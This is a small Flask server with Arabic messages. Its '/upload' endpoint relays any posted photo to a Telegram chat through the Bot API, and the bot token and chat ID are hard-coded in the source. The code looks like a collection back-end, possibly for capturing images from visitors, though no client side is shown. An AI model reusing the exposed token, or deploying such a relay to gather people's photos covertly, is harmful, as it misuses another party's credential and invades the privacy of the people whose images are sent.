from flask import Flask, request
import requests

app = Flask(__name__)

BOT_TOKEN = '7710320553:AAEwANx6RCJcuthKl041-H4KZ0zezIJr0io'
CHAT_ID = '6325478675'

@app.route('/upload', methods=['POST'])
def upload():
    print("🚀 وصلك طلب رفع صورة")
    file = request.files['photo']
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
    files = {'photo': file.stream}
    data = {'chat_id': CHAT_ID}
    response = requests.post(url, files=files, data=data)
    print("📸 رد تيليجرام:")
    print(response.text)
    return 'تم الاستلام'

import os

if __name__ == "__main__":
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)